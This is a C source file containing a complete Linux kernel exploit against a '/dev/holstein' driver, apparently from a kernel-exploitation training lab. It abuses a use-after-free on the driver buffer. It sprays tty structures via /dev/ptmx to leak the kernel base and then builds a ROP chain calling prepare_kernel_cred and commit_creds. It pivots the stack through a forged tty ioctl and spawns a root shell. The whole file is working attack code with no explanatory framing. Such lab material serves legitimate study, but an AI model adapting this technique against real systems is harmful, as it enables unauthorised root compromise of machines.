#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

int tty[100];
uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t push_rdx_pop_rsp		= 0xffffffff8114fbea;
uintptr_t pop_rdi_add_cl_cl_ret		= 0xffffffff812bf3d3;
uintptr_t prepare_kernel_cred		= 0xffffffff81072560;
uintptr_t pop_rcx_ret			= 0xffffffff8150b6d6;
uintptr_t mov_rdi_rax_rep_movsq_ret	= 0xffffffff81638e9b;
uintptr_t commit_creds			= 0xffffffff810723c0;
uintptr_t kpti				= 0xffffffff81800e26;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static int spray(void)
{
	int fd1 = -1;
	int fd2 = -1;

	memset(tty, 0, sizeof(tty));

	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1)
			goto err;
	}

	fd1 = open("/dev/holstein", O_RDWR);
	if (fd1 == -1)
		goto err;

	fd2 = open("/dev/holstein", O_RDWR);
	if (fd2 == -1)
		goto err;

	close(fd1);
	fd1 = -1;

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1)
			goto err;
	}

	return fd2;

err:
	if (fd1 > 0)
		close(fd1);
	if (fd2 > 0)
		close(fd2);
	for (int i = 0; i < 100; ++i) {
		if (tty[i] > 0) {
			close(tty[i]);
		}
	}
	perror("[-] open");
	return -1;
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void leak_offset_and_g_buf(int fd, uint8_t *data)
{
	uintptr_t ptr;

	read(fd, data, 0x40);
	ptr = *(uintptr_t *)&data[0x18];
	offset = ptr - 0xffffffff81c39c60;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x38] - 0x38;
	printf("[+] g_buf %p\n", g_buf);
}

int main(void)
{
	uint8_t data[0x400] = { 0 };
	uintptr_t *stack;
	int fd1;
	int fd2;

	save_state();

	fd1 = spray();
	leak_offset_and_g_buf(fd1, data);

	read(fd1, data, 0x400);

	stack = (uintptr_t *)data;
	*stack++ = OFFSET(pop_rdi_add_cl_cl_ret);
	*stack++ = (uintptr_t)NULL;
	*stack++ = OFFSET(prepare_kernel_cred);
	*stack++ = OFFSET(pop_rcx_ret);
	*stack++ = 0;
	*stack++ = OFFSET(mov_rdi_rax_rep_movsq_ret);
	*stack++ = OFFSET(commit_creds);
	*stack++ = OFFSET(kpti);
	*stack++ = 0;
	*stack++ = 0;
	*stack++ = (uintptr_t)shell;
	*stack++ = cs;
	*stack++ = rflags;
	*stack++ = rsp;
	*stack++ = ss;

	*(uintptr_t *)&data[0x3f8] = OFFSET(push_rdx_pop_rsp);

	write(fd1, data, 0x400);

	fd2 = spray();

	read(fd2, data, 0x18);
	*(uintptr_t *)&data[0x18] = g_buf + 0x3f8 - 0x0c * 8;
	write(fd2, data, 0x20);

	for (int i = 0; i < 100; ++i)
		ioctl(tty[i], 0, g_buf - 0x08);

	close(fd1);
	close(fd2);
	return EXIT_SUCCESS;
}
